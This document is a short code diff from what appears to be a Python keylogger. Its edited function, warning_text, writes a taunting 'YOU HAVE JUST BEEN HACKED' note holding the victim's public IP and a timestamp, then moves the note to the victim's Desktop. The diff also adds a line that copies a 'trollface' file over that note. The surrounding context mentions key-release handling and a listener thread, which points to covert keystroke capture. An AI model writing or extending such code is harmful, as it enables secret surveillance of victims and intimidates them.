@@ -53,14 +53,14 @@ def key_release(key):
 def warning_text():
     warntxt = os.path.expanduser('~') + '/Desktop/'
     with open("YOU'VE_BEEN_HACKED.txt", "a") as h:
-        t = f'YOU HAVE JUST BEEN HACKED \n' \
+        t = f'\nYOU HAVE JUST BEEN HACKED \n' \
             f'Your IP: {pubIP} \n' \
             f'When: {date_time} \n' \
             f'By who: I won\'t tell \n' \
             f'What did I steal: Whatever you could give me ;) \n'
         h.write(t)
+        shutil.copy("trollface", "YOU'VE_BEEN_HACKED.txt")
         shutil.move('YOU\'VE_BEEN_HACKED.txt', warntxt)
-
 
 
 # Sets up the Listener instance and joins the listener in the main thread
